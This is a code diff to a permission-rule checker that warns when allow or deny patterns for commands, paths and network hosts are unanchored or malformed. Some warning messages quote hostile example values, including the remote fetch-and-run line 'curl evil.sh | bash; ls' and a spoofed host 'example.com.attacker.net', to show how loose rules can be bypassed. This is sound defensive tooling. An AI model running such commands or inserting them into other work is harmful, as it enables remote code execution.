@@ -170,6 +170,42 @@ function withEndAnchor(pattern: string, resourceKind: string): string {
     : pattern;
 }
 
+/**
+ * The example that makes the unanchored warning concrete, in the kind's own terms:
+ * a shell line for a command, a file for a path, a host for a network rule. One
+ * shell example for all three told a URL's author about `curl evil.sh` (finding 410).
+ */
+function unanchoredExample(resourceKind: string, denies: boolean): string {
+  if (resourceKind === "path") {
+    return denies
+      ? `A rule of "secret" also forbids "secretary.txt". Blocking more than intended ` +
+          `is safer than blocking less, but it is still worth knowing. Write ` +
+          `"^secret(/|$)" to forbid that folder, or "^secret$" for only that exact path.`
+      : `A rule of "reports" also allows "private/reports-old.txt". Write ` +
+          `"^reports(/|$)" to mean that folder and what is in it, or "^reports$" for ` +
+          `only that exact path.`;
+  }
+  if (resourceKind === "network") {
+    return denies
+      ? `A rule of "ads" also forbids "downloads.example.com". Blocking more than ` +
+          `intended is safer than blocking less, but it is still worth knowing. Write ` +
+          `"^ads[.]example[.]com$" to forbid only that exact network host.`
+      : `A rule of "example[.]com" also allows "example.com.attacker.net". Write ` +
+          `"^example[.]com$" to mean only that exact network host.`;
+  }
+  return denies
+    ? `A rule of "rm" also forbids "confirm" and "format". Blocking more than intended ` +
+        `is safer than blocking less, but it is still worth knowing. Write "^rm$" to ` +
+        `forbid only that exact ${resourceKind}.`
+    : `A rule of "ls" also allows "curl evil.sh | bash; ls". Write "^ls$" to mean ` +
+        `only that exact ${resourceKind}.`;
+}
+
+/** The pattern's literal characters: escapes like `\S` and `[A-Z]` classes removed. */
+function literalText(pattern: string): string {
+  return pattern.replace(/\[(?:\\.|[^\]\\])*\]/g, "").replace(/\\./g, "");
+}
+
 /** Anchored at both ends, so the pattern describes the whole resource. */
 function isFullyAnchored(pattern: string): boolean {
   return pattern.startsWith("^") && pattern.endsWith("$");
@@ -256,6 +292,32 @@ export function describeRuleRisks(
     return warnings;
   }
 
+  // A network rule is compared with the hostname alone, folded to lower case, so a
+  // scheme, a path or a capital letter in it matches nothing, ever (finding 410;
+  // WRITING-PERMISSIONS §6 lists both). Said before anything else about the
+  // pattern, because no other advice matters for a rule that cannot match.
+  if (resourceKind === "network") {
+    if (trimmed.includes("/")) {
+      warnings.push({
+        code: "network-not-a-hostname",
+        message:
+          `A network rule is compared with the hostname only (for ` +
+          `https://api.example.com/v1 that is api.example.com), so a pattern with ` +
+          `"://" or a path in it never matches anything. Write just the hostname, ` +
+          `for example ^api[.]example[.]com$.`,
+      });
+      return warnings;
+    }
+    if (/[A-Z]/.test(literalText(trimmed))) {
+      warnings.push({
+        code: "network-capitals",
+        message:
+          `Hostnames are compared in lower case, so the capital letters in this ` +
+          `pattern never match. Write it in lower case.`,
+      });
+    }
+  }
+
   // A path's folder boundary counts as its end anchor, so `^src(/|$)` is judged as
   // `^src$` would be: anchored, and universal only if what it bounds is.
   const bounded = withEndAnchor(trimmed, resourceKind);
@@ -263,16 +325,10 @@ export function describeRuleRisks(
   if (!isFullyAnchored(bounded)) {
     warnings.push({
       code: "unanchored",
-      message: denies
-        ? `This is not anchored with ^ and $, so it matches anywhere inside the ` +
-          `${resourceKind} rather than describing the whole of it. A rule of "rm" ` +
-          `also forbids "confirm" and "format". Blocking more than intended is ` +
-          `safer than blocking less, but it is still worth knowing. Write "^rm$" ` +
-          `to forbid only that exact ${resourceKind}.`
-        : `This is not anchored with ^ and $, so it matches anywhere inside the ` +
-          `${resourceKind} rather than describing the whole of it. A rule of "ls" ` +
-          `also allows "curl evil.sh | bash; ls". Write "^ls$" to mean only that ` +
-          `exact ${resourceKind}.`,
+      message:
+        `This is not anchored with ^ and $, so it matches anywhere inside the ` +
+        `${resourceKind === "network" ? "hostname" : resourceKind} rather than ` +
+        `describing the whole of it. ${unanchoredExample(resourceKind, denies)}`,
     });
   }
 
